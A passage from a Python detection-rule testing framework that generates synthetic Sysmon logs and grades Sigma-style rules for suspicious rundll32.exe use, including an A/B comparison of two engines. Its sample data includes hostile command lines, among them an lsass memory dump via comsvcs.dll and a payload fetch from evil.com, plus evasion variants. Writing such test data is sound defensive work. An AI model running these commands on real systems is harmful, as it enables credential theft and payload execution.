  .metric-card {{ background: #1e293b; border-radius: 8px; padding: 1rem; text-align: center; }}
  .metric-card .value {{ font-size: 1.8rem; font-weight: 700; color: #f8fafc; }}
  .metric-card .label {{ font-size: 0.85rem; color: #94a3b8; margin-top: 0.25rem; }}
  table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.9rem; }}
  th {{ background: #1e293b; color: #94a3b8; padding: 0.6rem; text-align: left; }}
  td {{ padding: 0.5rem 0.6rem; border-bottom: 1px solid #1e293b; }}
  tr.pass {{ background: #0f172a; }} tr.fail {{ background: #1c1117; }}
  .badge-pass {{ background: #166534; color: #bbf7d0; padding: 2px 8px; border-radius: 4px; font-weight: 600; }}
  .badge-fail {{ background: #7f1d1d; color: #fecaca; padding: 2px 8px; border-radius: 4px; font-weight: 600; }}
  .failure-card {{ background: #1e1118; border-left: 3px solid #ef4444; padding: 1rem; margin: 0.5rem 0; border-radius: 4px; }}
  .failure-card h4 {{ color: #fca5a5; margin: 0 0 0.5rem; }}
  pre {{ background: #0f172a; padding: 0.75rem; border-radius: 4px; overflow-x: auto; font-size: 0.8rem; color: #94a3b8; }}
  .cm-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; max-width: 350px; margin: 1rem 0; }}
  .cm-cell {{ padding: 1rem; border-radius: 6px; text-align: center; font-weight: 700; font-size: 1.2rem; }}
  .cm-tp {{ background: #14532d; color: #bbf7d0; }} .cm-fp {{ background: #7f1d1d; color: #fecaca; }}
  .cm-fn {{ background: #78350f; color: #fed7aa; }} .cm-tn {{ background: #1e3a5f; color: #bfdbfe; }}
</style></head><body>
<h1>Detection Rule Validation Report</h1>
<p>Rule: <strong>{_html.escape(self.engine.rule_name)}</strong> | Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</p>

<h2>Overall Grade</h2>
<div style="display:flex;align-items:center;gap:2rem;">
  <span class="grade">{metrics['overall_grade']}</span>
  <div><div class="metric-card"><span class="value">{metrics['composite_score']:.2f}</span><div class="label">Composite Score</div></div></div>
</div>

<h2>Metrics</h2>
<div class="metrics-grid">
  <div class="metric-card"><span class="value">{metrics['accuracy']:.1%}</span><div class="label">Accuracy</div></div>
  <div class="metric-card"><span class="value">{metrics['precision']:.1%}</span><div class="label">Precision</div></div>
  <div class="metric-card"><span class="value">{metrics['recall']:.1%}</span><div class="label">Recall</div></div>
  <div class="metric-card"><span class="value">{metrics['f1_score']:.1%}</span><div class="label">F1 Score</div></div>
  <div class="metric-card"><span class="value">{metrics['evasion_resistance']:.0%}</span><div class="label">Evasion Resistance ({metrics['evasion_caught']}/{metrics['evasion_total']})</div></div>
  <div class="metric-card"><span class="value">{metrics['fp_candidates_triggered']}/{metrics['fp_candidates_total']}</span><div class="label">FP Stress Triggered</div></div>
</div>

<h2>Confusion Matrix</h2>
<div class="cm-grid">
  <div class="cm-cell cm-tp">TP: {cm['TP']}</div><div class="cm-cell cm-fp">FP: {cm['FP']}</div>
  <div class="cm-cell cm-fn">FN: {cm['FN']}</div><div class="cm-cell cm-tn">TN: {cm['TN']}</div>
</div>

<h2>All Results ({metrics['total_passed']}/{metrics['total_events']} passed)</h2>
<table><thead><tr><th>ID</th><th>Category</th><th>Description</th><th>Expected</th><th>Actual</th><th>Conf</th><th>Result</th></tr></thead>
<tbody>{rows_html}</tbody></table>

{"<h2>Failure Details</h2>" + failures_html if failures_html else ""}
</body></html>"""

        with open(path, "w") as f:
            f.write(html)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# RULE COMPARATOR (A/B Testing)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class RuleComparator:
    """
    Compare two detection engines (rule versions) against the same
    test dataset, producing a side-by-side diff report.
    """

    def __init__(self, engine_a: DetectionEngine, engine_b: DetectionEngine,
                 events: list[SyntheticEvent], grading: GradingConfig = None):
        self.runner_a = TestRunner(engine_a, events, grading)
        self.runner_b = TestRunner(engine_b, events, grading)

    def compare(self) -> dict:
        """Run both engines and return a comparison report."""
        self.runner_a.run()
        self.runner_b.run()

        metrics_a = self.runner_a.get_metrics()
        metrics_b = self.runner_b.get_metrics()

        # Find events where outcomes differ
        diffs = []
        for ra, rb in zip(self.runner_a.results, self.runner_b.results):
            if ra.outcome != rb.outcome:
                diffs.append({
                    "event_id": ra.event.event_id,
                    "description": ra.event.description,
                    "category": ra.event.category.value,
                    "engine_a_outcome": ra.outcome,
                    "engine_b_outcome": rb.outcome,
                    "engine_a_matched": ra.detection.matched,
                    "engine_b_matched": rb.detection.matched,
                    "engine_a_conditions": ra.detection.matched_conditions,
                    "engine_b_conditions": rb.detection.matched_conditions,
                })

        # Metric deltas
        deltas = {}
        for key in ["accuracy", "precision", "recall", "f1_score", "evasion_resistance", "composite_score"]:
            deltas[key] = round(metrics_b[key] - metrics_a[key], 4)

        return {
            "engine_a": {
                "name": self.runner_a.engine.rule_name,
                "metrics": metrics_a,
            },
            "engine_b": {
                "name": self.runner_b.engine.rule_name,
                "metrics": metrics_b,
            },
            "deltas": deltas,
            "outcome_diffs": diffs,
            "total_diffs": len(diffs),
            "verdict": self._verdict(deltas),
        }

    @staticmethod
    def _verdict(deltas: dict) -> str:
        score_delta = deltas.get("composite_score", 0)
        if score_delta > 0.05:
            return "SIGNIFICANT_IMPROVEMENT"
        elif score_delta > 0:
            return "MARGINAL_IMPROVEMENT"
        elif score_delta == 0:
            return "NO_CHANGE"
        elif score_delta > -0.05:
            return "MARGINAL_REGRESSION"
        else:
            return "SIGNIFICANT_REGRESSION"

    def print_comparison(self):
        """Print a formatted comparison report."""
        report = self.compare()
        a = report["engine_a"]
        b = report["engine_b"]

        print("=" * 80)
        print("  RULE COMPARISON REPORT (A/B)")
        print("=" * 80)
        print(f"\n  Engine A: {a['name']}")
        print(f"  Engine B: {b['name']}")
        print(f"\n  {'Metric':<25} {'Engine A':>12} {'Engine B':>12} {'Delta':>10}")
        print(f"  {'-' * 60}")

        for key in ["accuracy", "precision", "recall", "f1_score", "evasion_resistance", "composite_score"]:
            va = a["metrics"][key]
            vb = b["metrics"][key]
            delta = report["deltas"][key]
            arrow = "+" if delta > 0 else "" if delta == 0 else ""
            print(f"  {key:<25} {va:>11.1%} {vb:>11.1%} {arrow}{delta:>+9.1%}")

        print(f"\n  Grade:  {a['metrics']['overall_grade']}  -->  {b['metrics']['overall_grade']}")
        print(f"  Verdict: {report['verdict']}")

        if report["outcome_diffs"]:
            print(f"\n  Events with different outcomes ({report['total_diffs']}):")
            for d in report["outcome_diffs"]:
                print(f"    {d['event_id']}: {d['engine_a_outcome']} -> {d['engine_b_outcome']}  ({d['description'][:45]})")

        print(f"\n{'=' * 80}\n")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# EXAMPLE: Sigma-style Rundll32 Rule
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class ExampleRundll32Generator(TelemetryGenerator):
    """
    Generator for a Sigma rule detecting suspicious rundll32.exe usage.
    Produces realistic Sysmon EventID 1 logs with OriginalFileName support.
    """

    def generate_true_positives(self, count=10):
        events = []
        malicious_cmdlines = [
            r'C:\Windows\System32\rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication\";',
            r"rundll32.exe C:\Users\Public\payload.dll,DllMain",
            r"C:\Windows\System32\rundll32.exe C:\Temp\beacon.dll,Start",
            r"rundll32.exe \\10.0.0.5\share\malware.dll,Entry",
            r'C:\WINDOWS\system32\rundll32.exe vbscript:\"\..\mshtml,RunHTMLApplication\"',
            r"rundll32 C:\ProgramData\update.dll,#1",
            r"C:\Windows\System32\rundll32.exe advpack.dll,LaunchINFSection",
            r"rundll32.exe syssetup,SetupInfObjectInstallAction",
            r"C:\WINDOWS\System32\rundll32.exe url.dll,FileProtocolHandler http://evil.com/payload",
            r"rundll32.exe pcwutl.dll,LaunchApplication calc.exe",
            r"rundll32.exe zipfldr.dll,RouteTheCall C:\Temp\evil.exe",
            r"C:\Windows\System32\rundll32.exe comsvcs.dll MiniDump 624 C:\temp\lsass.dmp full",
        ]
        parent_images = [
            r"C:\Windows\System32\cmd.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"C:\Windows\explorer.exe",
            r"C:\Windows\System32\wscript.exe",
        ]
        for i in range(min(count, len(malicious_cmdlines))):
            base = self._base_sysmon_event(event_id=1)
            base["Image"] = r"C:\Windows\System32\rundll32.exe"
            base["OriginalFileName"] = "RUNDLL32.EXE"
            base["CommandLine"] = malicious_cmdlines[i]
            base["ParentImage"] = self.rng.choice(parent_images)
            events.append(SyntheticEvent(
                event_id=self._next_id(),
                category=EventCategory.TRUE_POSITIVE,
                description=f"Malicious rundll32 -- variant {i+1}",
                log_data=base,
                attack_technique="T1218.011",
                expected_detection=True,
                notes=f"Rundll32 proxy execution: {malicious_cmdlines[i][:60]}",
                tags=["rundll32", "proxy_execution"],
            ))
        return events

    def generate_true_negatives(self, count=15):
        events = []
        benign_processes = [
            (r"C:\Windows\System32\svchost.exe", r"svchost.exe -k netsvcs -p", ""),
            (r"C:\Windows\explorer.exe", r"C:\Windows\explorer.exe", ""),
            (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r"WINWORD.EXE /n", ""),
            (r"C:\Windows\System32\notepad.exe", r"notepad.exe C:\Users\admin\notes.txt", ""),
            (r"C:\Windows\System32\cmd.exe", r"cmd.exe /c dir C:\Users", ""),
            (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"chrome.exe --no-sandbox", ""),
            (r"C:\Windows\System32\taskmgr.exe", r"taskmgr.exe", ""),
            (r"C:\Windows\System32\mmc.exe", r"mmc.exe eventvwr.msc", ""),
            (r"C:\Windows\System32\wbem\wmiprvse.exe", r"wmiprvse.exe", ""),
            (r"C:\Windows\System32\dllhost.exe", r"dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}", ""),
            (r"C:\Windows\System32\conhost.exe", r"conhost.exe 0x4", ""),
            (r"C:\Windows\System32\dwm.exe", r"dwm.exe", ""),
            (r"C:\Program Files\7-Zip\7z.exe", r"7z.exe a archive.zip files", ""),
            (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"powershell.exe -Command Get-Date", ""),
            (r"C:\Windows\System32\mstsc.exe", r"mstsc.exe /v:server01", ""),
        ]
        for i in range(min(count, len(benign_processes))):
            base = self._base_sysmon_event(event_id=1)
            image, cmdline, ofn = benign_processes[i]
            base["Image"] = image
            base["CommandLine"] = cmdline
            if ofn:
                base["OriginalFileName"] = ofn
            base["ParentImage"] = r"C:\Windows\explorer.exe"
            events.append(SyntheticEvent(
                event_id=self._next_id(),
                category=EventCategory.TRUE_NEGATIVE,
                description=f"Benign process: {image.split(chr(92))[-1]}",
                log_data=base,
                expected_detection=False,
            ))
        return events

    def generate_fp_candidates(self, count=5):
        events = []
        legit_rundll32 = [
            (r"rundll32.exe shell32.dll,Control_RunDLL intl.cpl", "shell32 Control Panel"),
            (r"rundll32.exe setupapi.dll,InstallHinfSection", "setupapi INF install"),
            (r"C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll", "shell32 COM server"),
            (r"rundll32.exe shell32.dll,Options_RunDLL 0", "shell32 folder options"),
            (r"rundll32.exe setupapi.dll,SetupChangeFontSize", "setupapi font size"),
            (r"rundll32.exe printui.dll,PrintUIEntry /il", "printer installer"),
            (r"rundll32.exe user32.dll,LockWorkStation", "lock workstation"),
        ]
        for i in range(min(count, len(legit_rundll32))):
            base = self._base_sysmon_event(event_id=1)
            cmdline, desc = legit_rundll32[i]
            base["Image"] = r"C:\Windows\System32\rundll32.exe"
            base["OriginalFileName"] = "RUNDLL32.EXE"
            base["CommandLine"] = cmdline
            base["ParentImage"] = r"C:\Windows\explorer.exe"
            events.append(SyntheticEvent(
                event_id=self._next_id(),
                category=EventCategory.FALSE_POSITIVE_CANDIDATE,
                description=f"Legit rundll32: {desc}",
                log_data=base,
                expected_detection=False,
                notes="Legitimate Windows rundll32 usage -- should be filtered",
                tags=["rundll32", "legitimate"],
            ))
        return events

    def generate_evasion_samples(self, count=5):
        events = []
        evasion_variants = [
            # 1. Renamed binary -- OriginalFileName still says RUNDLL32.EXE
            {
                "image": r"C:\Temp\notmalware.exe",
                "cmdline": r"notmalware.exe C:\Temp\beacon.dll,Start",
                "original_filename": "RUNDLL32.EXE",
                "desc": "Renamed rundll32 -- binary copy with different name",
                "tags": ["renamed_binary", "pe_metadata"],
            },
            # 2. SysWOW64 path (32-bit on 64-bit)
            {
                "image": r"C:\Windows\SysWOW64\rundll32.exe",
                "cmdline": r"C:\Windows\SysWOW64\rundll32.exe C:\Temp\payload.dll,Run",
                "original_filename": "RUNDLL32.EXE",
                "desc": "SysWOW64 rundll32 -- 32-bit variant",
                "tags": ["syswow64"],
            },
            # 3. UNC path with spaces in filename
            {
                "image": r"C:\Windows\System32\rundll32.exe",
                "cmdline": r'rundll32.exe "\\fileserver\share\pay load.dll",Entry',
                "original_filename": "RUNDLL32.EXE",
                "desc": "UNC path with spaces in filename",
                "tags": ["unc_path", "spaces"],
            },
            # 4. Environment variable in path
            {
                "image": r"C:\Windows\System32\rundll32.exe",
                "cmdline": r"rundll32.exe %TEMP%\update.dll,DllRegisterServer",
                "original_filename": "RUNDLL32.EXE",
                "desc": "Environment variable path evasion",
                "tags": ["env_variable"],
            },
            # 5. shell32.dll abuse -- escaped comma + path traversal
            {
                "image": r"C:\Windows\System32\rundll32.exe",
                "cmdline": r"rundll32 shell32.dll\,Control_RunDLL ..\..\Temp\evil.cpl",
                "original_filename": "RUNDLL32.EXE",
                "desc": "Escaped comma + path traversal in shell32 call",
                "tags": ["filter_bypass", "path_traversal"],
            },
            # 6. Double-extension renamed binary
            {
                "image": r"C:\Users\Public\svchost.exe",
                "cmdline": r"svchost.exe C:\Users\Public\implant.dll,Run",
                "original_filename": "RUNDLL32.EXE",
                "desc": "Rundll32 masquerading as svchost.exe",
                "tags": ["renamed_binary", "masquerade"],
            },
            # 7. Case manipulation on command line
            {
                "image": r"C:\Windows\System32\rundll32.exe",
                "cmdline": r"C:\Windows\System32\rundll32.exe C:\TEMP\BEACON.DLL,START",
                "original_filename": "RUNDLL32.EXE",
                "desc": "All-caps DLL path evasion",
                "tags": ["case_manipulation"],
            },
        ]
        for i in range(min(count, len(evasion_variants))):
            v = evasion_variants[i]
            base = self._base_sysmon_event(event_id=1)
            base["Image"] = v["image"]
            base["CommandLine"] = v["cmdline"]
            base["OriginalFileName"] = v["original_filename"]
            base["ParentImage"] = r"C:\Windows\System32\cmd.exe"
            events.append(SyntheticEvent(
                event_id=self._next_id(),
                category=EventCategory.EVASION,
                description=v["desc"],
                log_data=base,
                attack_technique="T1218.011",
                expected_detection=True,
                notes=f"Evasion variant -- should ideally be caught: {v['desc']}",
                tags=v.get("tags", []),
            ))
        return events


class ExampleRundll32Engine(DetectionEngine):
    """
    ORIGINAL rule implementation (v1).

    Sigma logic:
        selection: Image|endswith: '\\rundll32.exe'
        filter:    CommandLine|contains: ['shell32.dll', 'setupapi.dll']
        condition: selection and not filter

    Known weaknesses:
      - Misses renamed binaries (OriginalFileName not checked)
      - Filter is naive: shell32.dll in command line whitelists even malicious uses
    """

    def __init__(self):
        super().__init__(
            rule_name="Suspicious Rundll32 Execution (v1 - Original)",
            rule_metadata={
                "format": "Sigma",
                "mitre_attack": ["T1218.011"],
                "severity": "medium",
                "log_source": "Sysmon EventID 1",
                "version": "1.0",
            }
        )

    def evaluate(self, event: dict) -> DetectionResult:
        matched_conditions = []

        # Selection: Image ends with \rundll32.exe
        selection = self.field_endswith(event, "Image", "\\rundll32.exe")
        if selection:
            matched_conditions.append("selection:Image|endswith:'\\rundll32.exe'")

        # Filter: CommandLine contains shell32.dll OR setupapi.dll
        filter_shell32 = self.field_contains(event, "CommandLine", "shell32.dll")
        filter_setupapi = self.field_contains(event, "CommandLine", "setupapi.dll")
        filter_match = filter_shell32 or filter_setupapi

        if filter_shell32:
            matched_conditions.append("filter:CommandLine|contains:'shell32.dll'")
        if filter_setupapi:
            matched_conditions.append("filter:CommandLine|contains:'setupapi.dll'")

        # Condition: selection AND NOT filter
        final_match = selection and not filter_match

        # Confidence scoring
        confidence = 0.0
        if final_match:
            confidence = 0.7
            cmdline = str(event.get("CommandLine", "")).lower()
            if any(s in cmdline for s in ["javascript:", "vbscript:", "http://", "https://", "comsvcs", "minidump"]):
                confidence = 0.95
            elif any(s in cmdline for s in [".dll,", "\\temp\\", "\\public\\", "\\programdata\\"]):
                confidence = 0.85

        return DetectionResult(
            event_id="",
            matched=final_match,
            matched_conditions=matched_conditions,
            confidence_score=confidence,
        )


class ImprovedRundll32Engine(DetectionEngine):
    """
    IMPROVED rule implementation (v2).

    Changes from v1:
      1. Also checks OriginalFileName == 'RUNDLL32.EXE' to catch renamed binaries.
      2. Filter is context-aware: whitelists shell32.dll / setupapi.dll only if
         the command line does NOT also contain path traversal, suspicious paths,
         or escaped commas that indicate filter abuse.
      3. Adds printui.dll and user32.dll,LockWorkStation to the allowlist.
      4. Adds suspicious parent process detection as a confidence booster.

    Sigma equivalent:
        selection_image:
            Image|endswith: '\\rundll32.exe'
        selection_ofn:
            OriginalFileName: 'RUNDLL32.EXE'
        filter_benign:
            CommandLine|contains:
                - 'shell32.dll'
                - 'setupapi.dll'
                - 'printui.dll'
                - 'user32.dll,LockWorkStation'
        filter_abuse_indicators:
            CommandLine|contains:
                - '..\\'
                - '../'
                - '\\,'
                - '/,'
        condition: (selection_image or selection_ofn) and not (filter_benign and not filter_abuse_indicators)
    """

    def __init__(self):
        super().__init__(
            rule_name="Suspicious Rundll32 Execution (v2 - Improved)",
            rule_metadata={
                "format": "Sigma",
                "mitre_attack": ["T1218.011"],
                "severity": "medium",
                "log_source": "Sysmon EventID 1",
                "version": "2.0",
            }
        )

        self._benign_dll_patterns = [
            "shell32.dll",
            "setupapi.dll",
            "printui.dll",
            "user32.dll,lockworkstation",
        ]
        self._abuse_indicators = [
            "..\\", "../", "\\,", "/,",
        ]
        self._suspicious_parents = [
            "\\wscript.exe", "\\cscript.exe", "\\mshta.exe",
            "\\winword.exe", "\\excel.exe", "\\powershell.exe",
        ]

    def evaluate(self, event: dict) -> DetectionResult:
        matched_conditions = []

        # Selection: Image ends with \rundll32.exe OR OriginalFileName is RUNDLL32.EXE
        sel_image = self.field_endswith(event, "Image", "\\rundll32.exe")
        sel_ofn = self.check_original_filename(event, "RUNDLL32.EXE")

        selection = sel_image or sel_ofn

        if sel_image:
            matched_conditions.append("selection:Image|endswith:'\\rundll32.exe'")
        if sel_ofn and not sel_image:
            matched_conditions.append("selection:OriginalFileName=='RUNDLL32.EXE' (renamed binary!)")

        if not selection:
            return DetectionResult(event_id="", matched=False, matched_conditions=matched_conditions)

        # Filter: benign DLL patterns in CommandLine
        cmdline_lower = str(event.get("CommandLine", "")).lower()
        benign_match = any(pat in cmdline_lower for pat in self._benign_dll_patterns)

        if benign_match:
            matched_conditions.append("filter:CommandLine contains benign DLL pattern")

        # Anti-abuse: check for path traversal or escaped commas even when benign DLL is present
        abuse_match = any(ind in cmdline_lower for ind in self._abuse_indicators)
        if abuse_match:
            matched_conditions.append("anti_abuse:CommandLine contains traversal/escape indicators")

        # Final logic: select AND NOT (benign_filter WITHOUT abuse)
        # If benign DLL is present but abuse indicators exist, do NOT filter it out
        if benign_match and not abuse_match:
            final_match = False
        else:
            final_match = True

        # Confidence scoring
        confidence = 0.0
        if final_match:
            confidence = 0.7

            # High confidence: scripting protocol abuse
            if any(s in cmdline_lower for s in ["javascript:", "vbscript:", "http://", "https://", "comsvcs", "minidump"]):
                confidence = 0.95
            # Medium-high: DLL loading from suspicious paths
            elif any(s in cmdline_lower for s in [".dll,", "\\temp\\", "\\public\\", "\\programdata\\", "\\users\\"]):
                confidence = 0.85

            # Boost for renamed binary
            if sel_ofn and not sel_image:
                confidence = min(confidence + 0.1, 1.0)
                matched_conditions.append("confidence_boost:renamed_binary")

            # Boost for suspicious parent
            parent = str(event.get("ParentImage", "")).lower()
            if any(p in parent for p in self._suspicious_parents):
                confidence = min(confidence + 0.05, 1.0)
                matched_conditions.append("confidence_boost:suspicious_parent")

        return DetectionResult(
            event_id="",
            matched=final_match,
            matched_conditions=matched_conditions,
            confidence_score=round(confidence, 2),
        )


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CLI ENTRY POINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    parser = argparse.ArgumentParser(
        description="Detection Rule Validation Framework v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python detection_validator.py                         # Run the built-in example (v1)
  python detection_validator.py --compare               # Compare v1 vs v2 (improved)
  python detection_validator.py --html report.html      # Export HTML report
  python detection_validator.py --json report.json      # Export JSON report
  python detection_validator.py --events data.json      # Load events from file
  python detection_validator.py --export-events out.json # Export generated events
  python detection_validator.py --engine improved        # Run the improved engine
  python detection_validator.py --tp 20 --tn 30         # Custom event counts
""",
    )
    parser.add_argument("--engine", choices=["original", "improved"], default="original",
                        help="Which engine to run (default: original)")
    parser.add_argument("--compare", action="store_true",
                        help="Run both engines and print comparison")
    parser.add_argument("--events", type=str, default=None,
                        help="Load events from a JSON file instead of generating")
    parser.add_argument("--export-events", type=str, default=None,
                        help="Export generated events to a JSON file")
    parser.add_argument("--json", type=str, default=None,
                        help="Export report to a JSON file")
    parser.add_argument("--html", type=str, default=None,
                        help="Export report to an HTML file")
    parser.add_argument("--tp", type=int, default=10, help="Number of true positive samples")
    parser.add_argument("--tn", type=int, default=15, help="Number of true negative samples")
    parser.add_argument("--fp", type=int, default=5, help="Number of FP candidate samples")
    parser.add_argument("--evasion", type=int, default=5, help="Number of evasion samples")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    parser.add_argument("--quiet", action="store_true", help="Suppress console report")

    args = parser.parse_args()

    # Generate or load events
    if args.events:
        events = TelemetryGenerator.import_events(args.events)
        print(f"Loaded {len(events)} events from {args.events}")
    else:
        generator = ExampleRundll32Generator(seed=args.seed)
        events = generator.generate_all(tp=args.tp, tn=args.tn, fp=args.fp, evasion=args.evasion)
        print(f"Generated {len(events)} synthetic events (seed={args.seed})")

    if args.export_events:
        TelemetryGenerator(seed=args.seed).export_events(events, args.export_events)
        print(f"Events exported to {args.export_events}")

    # Comparison mode
    if args.compare:
        engine_a = ExampleRundll32Engine()
        engine_b = ImprovedRundll32Engine()
        comparator = RuleComparator(engine_a, engine_b, events)
        comparator.print_comparison()

        if args.json:
            report = comparator.compare()
            with open(args.json, "w") as f:
                json.dump(report, f, indent=2)
            print(f"Comparison report saved to {args.json}")
        return

    # Single engine mode
    if args.engine == "improved":
        engine = ImprovedRundll32Engine()
    else:
        engine = ExampleRundll32Engine()

    runner = TestRunner(engine=engine, events=events)
    runner.run()

    if not args.quiet:
        runner.print_report()

    if args.json:
        report = runner.export_report_json()
        with open(args.json, "w") as f:
            json.dump(report, f, indent=2)
        print(f"JSON report saved to {args.json}")

    if args.html:
        runner.export_html_report(args.html)
        print(f"HTML report saved to {args.html}")


if __name__ == "__main__":
    main()
